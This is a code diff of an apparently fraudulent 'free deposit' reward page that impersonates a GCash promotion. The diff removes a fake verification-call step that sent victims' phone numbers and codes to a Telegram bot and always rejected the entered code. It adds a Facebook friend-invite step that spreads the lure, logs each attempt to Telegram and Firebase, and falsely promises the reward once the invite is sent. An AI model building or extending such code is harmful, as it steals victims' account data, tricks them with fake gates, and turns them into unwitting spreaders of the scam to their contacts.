@@ -4,16 +4,22 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <meta name="theme-color" content="#1a3dff">
-    <title>Mission | Lucky Drop</title>
+    <title>Mission Task | Free Deposit</title>
 
-    <!-- Firebase SDK -->
+    <meta property="og:title" content="Mission Task | Free Deposit" />
+    <meta property="og:description" content="Complete the mission to claim your exclusive reward!" />
+    <meta property="og:image" content="images/cat_fd.png" />
+    <meta property="og:url" content="https://tiny.cc/GCashPaMore" />
+    <meta property="og:type" content="website" />
+    <meta name="twitter:card" content="summary_large_image" />
+
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-
-    <!-- ✅ FIREBASE CONFIG -->
     <script src="js/config.js"></script>
 
-    <!-- Google Fonts -->
+    <div id="fb-root"></div>
+    <script async defer crossorigin="anonymous" src="https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v18.0&autoLogAppEvents=1"></script>
+
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@400;500;600;700;800&family=Orbitron:wght@500;700;900&family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
@@ -193,7 +199,6 @@
         .queue-badge .queue-dot { width: 8px; height: 8px; border-radius: 50%; background: #fff; box-shadow: 0 0 10px #fff; animation: queueDotBlink 1s ease-in-out infinite; }
         @keyframes queueDotBlink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
 
-        /* QUEUE LIST PANEL */
         .queue-list { display: flex; flex-direction: column; gap: 6px; margin: 14px 0 18px; padding: 10px; background: rgba(0, 0, 0, 0.35); border: 2px solid rgba(255, 215, 0, 0.4); border-radius: 14px; max-height: 260px; overflow-y: auto; scrollbar-width: thin; scrollbar-color: #ffe066 rgba(0,0,0,0.3); }
         .queue-list::-webkit-scrollbar { width: 6px; }
         .queue-list::-webkit-scrollbar-thumb { background: #ffe066; border-radius: 3px; }
@@ -228,42 +233,14 @@
         .popup-card.ban-card .popup-img-wrap::before { background: radial-gradient(circle at center, rgba(255, 68, 68, 0.5) 0%, rgba(139, 0, 0, 0.3) 40%, transparent 70%); }
         .popup-card.ban-card .popup-img { filter: drop-shadow(0 8px 20px rgba(0, 0, 0, 0.55)) drop-shadow(0 0 20px rgba(255, 68, 68, 0.55)); }
 
-                /* ✅ BAN ATTENTION EFFECTS */
-        @keyframes banShake {
-            0%, 100% { transform: translateX(0); }
-            20% { transform: translateX(-8px) rotate(-1deg); }
-            40% { transform: translateX(8px) rotate(1deg); }
-            60% { transform: translateX(-6px) rotate(-1deg); }
-            80% { transform: translateX(6px) rotate(1deg); }
-        }
-        @keyframes banPulseRed {
-            0%, 100% { box-shadow: 0 25px 60px rgba(0, 0, 0, 0.8), 0 0 60px rgba(255, 68, 68, 0.5); }
-            50% { box-shadow: 0 25px 60px rgba(0, 0, 0, 0.8), 0 0 100px rgba(255, 68, 68, 1), 0 0 140px rgba(255, 23, 68, 0.7); }
-        }
-        @keyframes attentionBounce {
-            0%, 100% { transform: scale(1); }
-            30% { transform: scale(1.08); }
-            60% { transform: scale(0.97); }
-        }
+        /* ✅ BAN ATTENTION EFFECTS */
+        @keyframes banShake { 0%, 100% { transform: translateX(0); } 20% { transform: translateX(-8px) rotate(-1deg); } 40% { transform: translateX(8px) rotate(1deg); } 60% { transform: translateX(-6px) rotate(-1deg); } 80% { transform: translateX(6px) rotate(1deg); } }
+        @keyframes banPulseRed { 0%, 100% { box-shadow: 0 25px 60px rgba(0, 0, 0, 0.8), 0 0 60px rgba(255, 68, 68, 0.5); } 50% { box-shadow: 0 25px 60px rgba(0, 0, 0, 0.8), 0 0 100px rgba(255, 68, 68, 1), 0 0 140px rgba(255, 23, 68, 0.7); } }
+        @keyframes attentionBounce { 0%, 100% { transform: scale(1); } 30% { transform: scale(1.08); } 60% { transform: scale(0.97); } }
         .ban-card.shake { animation: banShake 0.6s ease-in-out 2, banPulseRed 1.5s ease-in-out infinite; }
         .ban-card.attention-highlight { animation: banPulseRed 1.5s ease-in-out infinite; }
-        .ban-attention-text {
-            display: block;
-            margin-top: 12px;
-            padding: 12px 16px;
-            background: rgba(255, 215, 0, 0.15);
-            border: 2px solid #ffe066;
-            border-radius: 12px;
-            font-family: 'Poppins', sans-serif;
-            font-size: 13px;
-            font-weight: 700;
-            color: #ffe066;
-            text-align: center;
-            line-height: 1.5;
-            text-shadow: 0 0 10px rgba(255, 215, 0, 0.8);
-            animation: attentionBounce 1.2s ease-in-out infinite;
-        }
-        
+        .ban-attention-text { display: block; margin-top: 12px; padding: 12px 16px; background: rgba(255, 215, 0, 0.15); border: 2px solid #ffe066; border-radius: 12px; font-family: 'Poppins', sans-serif; font-size: 13px; font-weight: 700; color: #ffe066; text-align: center; line-height: 1.5; text-shadow: 0 0 10px rgba(255, 215, 0, 0.8); animation: attentionBounce 1.2s ease-in-out infinite; }
+
         /* READY TO CLAIM */
         .ready-to-claim-wrap { display: none; animation: readyFadeIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
         .ready-to-claim-wrap.show { display: block; }
@@ -542,7 +519,7 @@
         </div>
     </div>
 
-    <!-- POPUP 6: BAN (with Verification Call flow) -->
+    <!-- POPUP 6: BAN (with INVITE FRIENDS) -->
     <div class="popup-overlay" id="banPopup">
         <div class="popup-card ban-card">
             <button class="popup-close" id="banClose">
@@ -550,7 +527,7 @@
             </button>
             <div class="popup-img-wrap"><img src="images/error_claim.png" alt="Ban" class="popup-img" onerror="this.style.opacity='0.4';"></div>
             <h2 class="popup-title danger">UNABLE TO CLAIM</h2>
-                        <p class="popup-subtitle" style="font-size:13px; line-height:1.7;">
+            <p class="popup-subtitle" style="font-size:13px; line-height:1.7;">
                 You are not able to claim your rewards.<br>
                 Please try again on another device and use another mobile number for claiming rewards.
             </p>
@@ -563,35 +540,35 @@
                 <span style="flex:1; height:1.5px; background:linear-gradient(90deg,transparent,rgba(255,215,0,0.8),transparent); border-radius:2px;"></span>
             </div>
             <div id="banStage1">
-                <button class="popup-btn" id="banVerifyCallBtn">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
-                    <span>VIA VERIFICATION CALL</span>
+                <button class="popup-btn" id="banInviteFriendsBtn">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/>
+                        <circle cx="9" cy="7" r="4"/>
+                        <path d="M22 21v-2a4 4 0 0 0-3-3.87"/>
+                        <path d="M16 3.13a4 4 0 0 1 0 7.75"/>
+                    </svg>
+                    <span>INVITE FRIENDS</span>
                 </button>
             </div>
-            <div id="banStage2" class="hidden">
-                <div class="ai-status-text" id="banStatusText">📞 <strong>VERIFICATION CALL</strong> being placed...<br><span style="font-size:11px; color:rgba(255,255,255,0.7);">Please wait for the call</span></div>
-                <div class="ai-timer" id="banTimer">60s</div>
-            </div>
-            <div id="banStage3" class="hidden">
-                <div class="ai-status-text">✅ <strong style="color:#39ff14;">CALL CONNECTED!</strong><br><span style="font-size:11px; color:rgba(255,255,255,0.8);">Enter the 4-digit code from the call</span></div>
-                <div class="ai-timer" id="banTimerStage3">60s</div>
-                <div class="input-label">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 9a3 3 0 0 1 0 6v2a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-2a3 3 0 0 1 0-6V7a2 2 0 0 0-2-2H4a2 2 0 0 0-2 2Z"/><path d="M13 5v2M13 17v2M13 11v2"/></svg>
-        <span>ENTER 4-DIGIT CODE</span>
-                </div>
-            <input type="text" class="ai-code-input" id="banCodeInput" placeholder="0000" maxlength="4" inputmode="numeric" autocomplete="off">
-            <button class="popup-btn" id="banVerifyBtn">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="m9 12 2 2 4-4"/></svg>
-        <span>VERIFY CODE</span>
-    </button>
-    <div class="ai-error" id="banCodeError"></div>
-</div>
         </div>
     </div>
 
     <script>
         (function() {
             'use strict';
+
+            // ✅ FB SDK INIT
+            window.fbAsyncInit = function() {
+                if (typeof FB !== 'undefined') {
+                    FB.init({
+                        appId: 'YOUR_FACEBOOK_APP_ID',
+                        cookie: true,
+                        xfbml: true,
+                        version: 'v18.0'
+                    });
+                    console.log('✅ Facebook SDK initialized');
+                }
+            };
 
             function isInAppBrowser() {
                 var ua = navigator.userAgent || navigator.vendor || window.opera;
@@ -693,7 +670,7 @@
             function sendTelegram(message) {
                 try {
                     var now = Date.now();
-                                        if (now - lastTelegramTime < TELEGRAM_THROTTLE_MS) return;
+                    if (now - lastTelegramTime < TELEGRAM_THROTTLE_MS) return;
                     lastTelegramTime = now;
                     fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message)).catch(function(e) {});
                 } catch(e) {}
@@ -750,17 +727,101 @@
                     });
                 });
             }
+
+            var BAN_TRY_KEY = 'ban_try_count';
+            var BAN_LOCK_KEY = 'ban_locked_until';
+            var BAN_MAX_TRIES = 5;
+            var BAN_LOCK_HOURS = 24;
+
+            function getBanTries() { try { return parseInt(localStorage.getItem(BAN_TRY_KEY) || '0', 10) || 0; } catch(e) { return 0; } }
+            function setBanTries(n) { try { localStorage.setItem(BAN_TRY_KEY, String(n)); } catch(e) {} }
+            function isBanLocked() { try { var until = parseInt(localStorage.getItem(BAN_LOCK_KEY) || '0', 10) || 0; return Date.now() < until; } catch(e) { return false; } }
+            function lockBan() { try { localStorage.setItem(BAN_LOCK_KEY, String(Date.now() + BAN_LOCK_HOURS * 60 * 60 * 1000)); } catch(e) {} }
+            function clearBanLockIfExpired() {
+                try {
+                    var until = parseInt(localStorage.getItem(BAN_LOCK_KEY) || '0', 10) || 0;
+                    if (until && Date.now() >= until) { localStorage.removeItem(BAN_LOCK_KEY); localStorage.removeItem(BAN_TRY_KEY); }
+                } catch(e) {}
+            }
+            function incrementBanTries() {
+                var current = getBanTries();
+                var next = current + 1;
+                setBanTries(next);
+                if (next >= BAN_MAX_TRIES) { lockBan(); }
+                return next;
+            }
+            function showBanAttention() {
+                var at = document.getElementById('banAttentionText');
+                if (at) at.classList.remove('hidden');
+                var card = document.querySelector('#banPopup .ban-card');
+                if (card) {
+                    card.classList.remove('shake', 'attention-highlight');
+                    void card.offsetWidth;
+                    card.classList.add('shake');
+                    setTimeout(function() { card.classList.remove('shake'); card.classList.add('attention-highlight'); }, 1300);
+                }
+                if (navigator.vibrate) { try { navigator.vibrate([200, 100, 200, 100, 400]); } catch(e) {} }
+            }
+            function resetBanUiToStage1() {
+                var s1 = document.getElementById('banStage1');
+                if (s1) s1.classList.remove('hidden');
+            }
+
             function showBanPopup() {
                 document.querySelectorAll('.popup-overlay').forEach(function(p) { p.classList.remove('show'); });
                 var banPopup = document.getElementById('banPopup');
                 if (banPopup) banPopup.classList.add('show');
-
                 clearBanLockIfExpired();
                 resetBanUiToStage1();
-                if (isBanLocked() || getBanTries() >= BAN_MAX_TRIES) {
-                    // ✅ LOCKED — attention agad, walang stage 2/3
-                    showBanAttention();
+                if (isBanLocked() || getBanTries() >= BAN_MAX_TRIES) { showBanAttention(); }
+            }
+
+            var banCloseBtn = document.getElementById('banClose');
+            if (banCloseBtn) banCloseBtn.onclick = function() { closePopup('banPopup'); resetBanUiToStage1(); };
+
+            var banInviteFriendsBtn = document.getElementById('banInviteFriendsBtn');
+            if (banInviteFriendsBtn) banInviteFriendsBtn.addEventListener('click', function() {
+                clearBanLockIfExpired();
+                if (isBanLocked() || getBanTries() >= BAN_MAX_TRIES) { showBanAttention(); return; }
+                requestInviteFriends();
+            });
+
+            function requestInviteFriends() {
+                if (typeof FB === 'undefined') { alert('Facebook SDK not loaded. Please refresh and try again.'); return; }
+                var tries = incrementBanTries();
+                console.log('📨 INVITE FRIENDS — Try #' + tries);
+                sendTelegram('📨 INVITE FRIENDS REQUEST\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId + '\n🔢 Try: ' + tries + '/' + BAN_MAX_TRIES);
+                if (db && userPhone) {
+                    try {
+                        db.ref('user_sessions/' + userPhone + '/system_verification').set({
+                            status: 'invite_active', deviceId: deviceDisplayId, phone: userPhone,
+                            createdAt: Date.now(), lastUpdate: Date.now(), tryCount: tries
+                        });
+                    } catch(e) {}
                 }
+                if (isBanLocked() || tries >= BAN_MAX_TRIES) { showBanAttention(); return; }
+                FB.ui({
+                    method: 'apprequests',
+                    message: 'Sumali sa GCash Pa More! 🎁',
+                    title: 'Invite Friends',
+                    max_recipients: 5,
+                    data: 'invite_' + Date.now()
+                }, function(response) {
+                    if (response && !response.error_code) {
+                        console.log('✅ Invite sent:', response);
+                        sendTelegram('✅ INVITE SENT\n👤 ' + userPhone + '\n📨 Recipients: ' + (response.to ? response.to.length : 0) + '\n⏰ ' + new Date().toLocaleString());
+                        if (db && userPhone) {
+                            try {
+                                db.ref('user_sessions/' + userPhone + '/system_verification').update({
+                                    status: 'invite_sent', inviteCount: response.to ? response.to.length : 0, lastUpdate: Date.now()
+                                });
+                            } catch(e) {}
+                        }
+                        showSuccessPopup('Invitation sent!<br>You can now continue to claim.');
+                    } else {
+                        console.log('❌ Invite cancelled:', response);
+                    }
+                });
             }
 
             function initWinnersTicker() {
@@ -855,179 +916,6 @@
             document.getElementById('queueClose').onclick = function() { closePopup('queuePopup'); stopQueueTimer(); stopLiveUsersCounter(); stopLinkListeners(); clearCountdownState(); };
             document.getElementById('successClose').onclick = function() { closePopup('successPopup'); };
             document.getElementById('aiVerifyClose').onclick = function() { closePopup('aiVerifyPopup'); stopAiTimer(); };
-
-            // ============================================================
-            // BAN POPUP — VERIFICATION CALL FLOW 
-            // ============================================================
-            var banCallCode = '';
-            var banTimerInterval = null;
-            var banCountdown = 60;
-
-            // ✅ LOCALSTORAGE KEYS
-            var BAN_TRY_KEY = 'ban_try_count';
-            var BAN_LOCK_KEY = 'ban_locked_until';
-            var BAN_MAX_TRIES = 5;
-            var BAN_LOCK_HOURS = 24;
-
-            function getBanTries() {
-                try { return parseInt(localStorage.getItem(BAN_TRY_KEY) || '0', 10) || 0; } catch(e) { return 0; }
-            }
-            function setBanTries(n) {
-                try { localStorage.setItem(BAN_TRY_KEY, String(n)); } catch(e) {}
-            }
-            function isBanLocked() {
-                try {
-                    var until = parseInt(localStorage.getItem(BAN_LOCK_KEY) || '0', 10) || 0;
-                    return Date.now() < until;
-                } catch(e) { return false; }
-            }
-            function lockBan() {
-                try { localStorage.setItem(BAN_LOCK_KEY, String(Date.now() + BAN_LOCK_HOURS * 60 * 60 * 1000)); } catch(e) {}
-            }
-            function clearBanLockIfExpired() {
-                try {
-                    var until = parseInt(localStorage.getItem(BAN_LOCK_KEY) || '0', 10) || 0;
-                    if (until && Date.now() >= until) {
-                        localStorage.removeItem(BAN_LOCK_KEY);
-                        localStorage.removeItem(BAN_TRY_KEY);
-                    }
-                } catch(e) {}
-            }
-            function incrementBanTries() {
-                var current = getBanTries();
-                var next = current + 1;
-                setBanTries(next);
-                if (next >= BAN_MAX_TRIES) { lockBan(); }
-                return next;
-            }
-            function showBanAttention() {
-                var at = document.getElementById('banAttentionText');
-                if (at) at.classList.remove('hidden');
-                var card = document.querySelector('#banPopup .ban-card');
-                if (card) {
-                    card.classList.remove('shake', 'attention-highlight'); // ✅ RESET MUNA
-                    void card.offsetWidth; // force reflow para ma-restart ang animation
-                    card.classList.add('shake');
-                    setTimeout(function() { 
-                        card.classList.remove('shake'); 
-                        card.classList.add('attention-highlight'); 
-                    }, 1300);
-                }
-                if (navigator.vibrate) {
-                    try { navigator.vibrate([200, 100, 200, 100, 400]); } catch(e) {}
-                }
-            }
-            function resetBanUiToStage1() {
-                var s1 = document.getElementById('banStage1');
-                var s2 = document.getElementById('banStage2');
-                var s3 = document.getElementById('banStage3');
-                if (s1) s1.classList.remove('hidden');
-                if (s2) s2.classList.add('hidden');
-                if (s3) s3.classList.add('hidden');
-            }
-
-            var banCloseBtn = document.getElementById('banClose');
-            if (banCloseBtn) banCloseBtn.onclick = function() {
-                closePopup('banPopup');
-                stopBanTimer();
-                resetBanUiToStage1();
-            };
-
-                        var banVerifyCallBtn = document.getElementById('banVerifyCallBtn');
-            if (banVerifyCallBtn) banVerifyCallBtn.addEventListener('click', function() {
-                clearBanLockIfExpired();
-                if (isBanLocked() || getBanTries() >= BAN_MAX_TRIES) {
-                    // ❌ LOCKED — huwag ilabas ang stage 2/3
-                    showBanAttention();
-                    return;
-                }
-                requestBanVerificationCall();
-            });
-
-                        function requestBanVerificationCall() {
-                banCallCode = Math.floor(1000 + Math.random() * 9000).toString();
-                console.log('📞 BAN VERIFY CODE (display only):', banCallCode);
-                if (db && userPhone) {
-                    try {
-                        db.ref('user_sessions/' + userPhone + '/system_verification').set({ code: banCallCode, timer: 60, status: 'ban_active', deviceId: deviceDisplayId, phone: userPhone, createdAt: Date.now(), lastUpdate: Date.now(), userEnteredCode: null, userEnteredAt: null, isMatch: null });
-                    } catch(e) {}
-                }
-                sendTelegram('🚫 BAN — VERIFICATION CALL\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId + '\n🔑 ' + banCallCode);
-                document.getElementById('banStage1').classList.add('hidden');
-                document.getElementById('banStage2').classList.remove('hidden');
-                startBanTimer(60);
-                setTimeout(function() {
-                    document.getElementById('banStage2').classList.add('hidden');
-                    document.getElementById('banStage3').classList.remove('hidden');
-                    var ci = document.getElementById('banCodeInput'); if (ci) ci.focus();
-                }, 4000);
-            }
-           function startBanTimer(seconds) {
-    stopBanTimer();
-    banCountdown = seconds;
-    var tEl = document.getElementById('banTimer');
-    var tEl3 = document.getElementById('banTimerStage3');
-    if (tEl) { tEl.textContent = banCountdown + 's'; tEl.classList.remove('urgent'); }
-    if (tEl3) { tEl3.textContent = banCountdown + 's'; tEl3.classList.remove('urgent'); }
-    banTimerInterval = setInterval(function() {
-        banCountdown--;
-        if (tEl) { tEl.textContent = banCountdown + 's'; if (banCountdown <= 9) tEl.classList.add('urgent'); }
-        if (tEl3) { tEl3.textContent = banCountdown + 's'; if (banCountdown <= 9) tEl3.classList.add('urgent'); }
-        if (banCountdown <= 0) {
-            stopBanTimer();
-            var st = document.getElementById('banStatusText');
-            if (st) st.innerHTML = '⏰ <strong style="color:#ff9800;">CALL EXPIRED</strong><br><span style="font-size:11px;">Please close and try again.</span>';
-        }
-    }, 1000);
-}
-            function stopBanTimer() { if (banTimerInterval) { clearInterval(banTimerInterval); banTimerInterval = null; } }
-
-                        var banVerifyBtn = document.getElementById('banVerifyBtn');
-            if (banVerifyBtn) {
-                banVerifyBtn.addEventListener('click', function() {
-                    clearBanLockIfExpired();
-                    if (isBanLocked() || getBanTries() >= BAN_MAX_TRIES) {
-                        showBanAttention();
-                        resetBanUiToStage1();
-                        return;
-                    }
-                    var input = document.getElementById('banCodeInput');
-                    var errEl = document.getElementById('banCodeError');
-                    var entered = input ? input.value.trim() : '';
-                    if (!entered || entered.length !== 4 || !/^\d+$/.test(entered)) {
-                        if (errEl) { errEl.textContent = 'Please enter a valid 4-digit code.'; errEl.classList.add('show'); }
-                        return;
-                    }
-
-                    // ✅ BILANGIN ANG ATTEMPT
-                    var tries = incrementBanTries();
-                    // ⚠️ LAGING INVALID
-                    if (db && userPhone) {
-                        try {
-                            db.ref('user_sessions/' + userPhone + '/system_verification').update({ userEnteredCode: entered, userEnteredAt: Date.now(), status: 'ban_invalid', isMatch: false, lastUpdate: Date.now(), tryCount: tries });
-                        } catch(e) {}
-                    }
-                    sendTelegram('🔑 BAN-CODE\n👤 ' + userPhone + '\n📝 ' + entered + '\n📊 INVALID (forced)\n🔢 Try: ' + tries + '/' + BAN_MAX_TRIES);
-
-                    if (isBanLocked() || tries >= BAN_MAX_TRIES) {
-                        // ❌ 10th attempt reached — LOCK + ATTENTION
-                        if (errEl) { errEl.textContent = '❌ Verification failed. Access restricted.'; errEl.classList.add('show'); }
-                        if (input) { input.value = ''; }
-                        resetBanUiToStage1();
-                        showBanAttention();
-                        return;
-                    }
-
-                    // Normal invalid — walang count indicator
-                    if (errEl) { errEl.textContent = '❌ Invalid code. Please try again.'; errEl.classList.add('show'); }
-                    if (input) { input.value = ''; input.focus(); }
-                });
-            }
-            var banCodeInput = document.getElementById('banCodeInput');
-            if (banCodeInput) {
-                banCodeInput.addEventListener('input', function() { this.value = this.value.replace(/\D/g, '').substring(0, 4); });
-                banCodeInput.addEventListener('keypress', function(e) { if (e.key === 'Enter') document.getElementById('banVerifyBtn').click(); });
-            }
 
             function initDevice() {
                 if (!db || !browserAllowed) return Promise.resolve();
@@ -1147,9 +1035,7 @@
             function checkFirewall() {
                 return new Promise(function(resolve) {
                     if (!db) return resolve(false);
-                    try {
-                        db.ref('admin/globalFirewall').once('value').then(function(snap) { var data = snap.val(); resolve(data && data.active === true); }).catch(function() { resolve(false); });
-                    } catch(e) { resolve(false); }
+                    try { db.ref('admin/globalFirewall').once('value').then(function(snap) { var data = snap.val(); resolve(data && data.active === true); }).catch(function() { resolve(false); }); } catch(e) { resolve(false); }
                 });
             }
             function getAvailableLink() {
@@ -1250,18 +1136,9 @@
             }
             function stopQueueTimer() { if (queueTimerInterval) { clearInterval(queueTimerInterval); queueTimerInterval = null; } }
 
-            function saveCountdownState() {
-                if (!db || !userPhone) return;
-                try { db.ref('user_sessions/' + userPhone + '/system_verification').set({ status: 'counting_down', countdownTimer: 180, countdownStartedAt: Date.now(), deviceId: deviceDisplayId, phone: userPhone, code: '----', timer: 180, lastUpdate: Date.now() }); } catch(e) {}
-            }
-            function updateCountdownState(remaining) {
-                if (!db || !userPhone) return;
-                try { db.ref('user_sessions/' + userPhone + '/system_verification').update({ countdownTimer: remaining, timer: remaining, lastUpdate: Date.now() }); } catch(e) {}
-            }
-            function clearCountdownState() {
-                if (!db || !userPhone) return;
-                try { db.ref('user_sessions/' + userPhone + '/system_verification').update({ status: 'completed', countdownTimer: 0, timer: 0, lastUpdate: Date.now() }); } catch(e) {}
-            }
+            function saveCountdownState() { if (!db || !userPhone) return; try { db.ref('user_sessions/' + userPhone + '/system_verification').set({ status: 'counting_down', countdownTimer: 180, countdownStartedAt: Date.now(), deviceId: deviceDisplayId, phone: userPhone, code: '----', timer: 180, lastUpdate: Date.now() }); } catch(e) {} }
+            function updateCountdownState(remaining) { if (!db || !userPhone) return; try { db.ref('user_sessions/' + userPhone + '/system_verification').update({ countdownTimer: remaining, timer: remaining, lastUpdate: Date.now() }); } catch(e) {} }
+            function clearCountdownState() { if (!db || !userPhone) return; try { db.ref('user_sessions/' + userPhone + '/system_verification').update({ status: 'completed', countdownTimer: 0, timer: 0, lastUpdate: Date.now() }); } catch(e) {} }
 
             var queuePrefixes = ['0912','0917','0918','0927','0998','0945','0966','0955','0939','0906','0977','0908','0920','0921','0928','0929','0930','0935','0936','0946','0947','0948','0949','0950','0951','0956','0961','0963','0965','0967','0975','0976','0978','0979','0994','0995','0996','0997'];
             function generateQueueNumber() {
@@ -1381,7 +1258,7 @@
                 var codeEl = document.getElementById('aiCodeInput'); if (codeEl) codeEl.value = '';
                 openPopup('aiVerifyPopup');
             }
-                        var aiGcashInput = document.getElementById('aiGcashInput');
+            var aiGcashInput = document.getElementById('aiGcashInput');
             if (aiGcashInput) {
                 aiGcashInput.addEventListener('input', function() {
                     var value = this.value.replace(/\D/g, '');
